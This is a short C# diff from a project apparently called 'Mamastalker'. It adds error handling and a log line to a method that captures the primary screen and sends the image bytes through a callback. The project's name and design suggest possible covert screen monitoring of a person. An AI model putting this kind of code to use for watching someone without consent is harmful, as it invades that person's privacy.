@@ -38,26 +38,35 @@ namespace Mamastalker.Common.FormsPresentation.ResponseHandlers
 
         private void SendScreenshot()
         {
-            var screen = Screen.PrimaryScreen;
+            try
+            {
+                var screen = Screen.PrimaryScreen;
 
-            var bitmap = new Bitmap(screen.Bounds.Width,
-                                    screen.Bounds.Height,
-                                    PixelFormat.Format32bppArgb);
+                var bitmap = new Bitmap(screen.Bounds.Width,
+                                        screen.Bounds.Height,
+                                        PixelFormat.Format32bppArgb);
 
-            var bitmapGraphics = Graphics.FromImage(bitmap);
+                var bitmapGraphics = Graphics.FromImage(bitmap);
 
-            bitmapGraphics.CopyFromScreen(screen.Bounds.X,
-                                    screen.Bounds.Y,
-                                    0,
-                                    0,
-                                    screen.Bounds.Size,
-                                    CopyPixelOperation.SourceCopy);
+                bitmapGraphics.CopyFromScreen(screen.Bounds.X,
+                                        screen.Bounds.Y,
+                                        0,
+                                        0,
+                                        screen.Bounds.Size,
+                                        CopyPixelOperation.SourceCopy);
 
-            var stringifiedBitmap = _bitmapStringify.Stringify(bitmap);
+                var stringifiedBitmap = _bitmapStringify.Stringify(bitmap);
 
-            var bitmapBytes = _byteArrayStringify.Parse(stringifiedBitmap);
+                var bitmapBytes = _byteArrayStringify.Parse(stringifiedBitmap);
 
-            _listeningCallback?.Invoke(bitmapBytes);
+                Console.WriteLine("took screenshot, sending...");
+
+                _listeningCallback?.Invoke(bitmapBytes);
+            } catch (Exception e)
+            {
+                Console.WriteLine(e);
+                throw;
+            }
         }
 
         public async Task StartUpdateLoop(int refreshInterval)
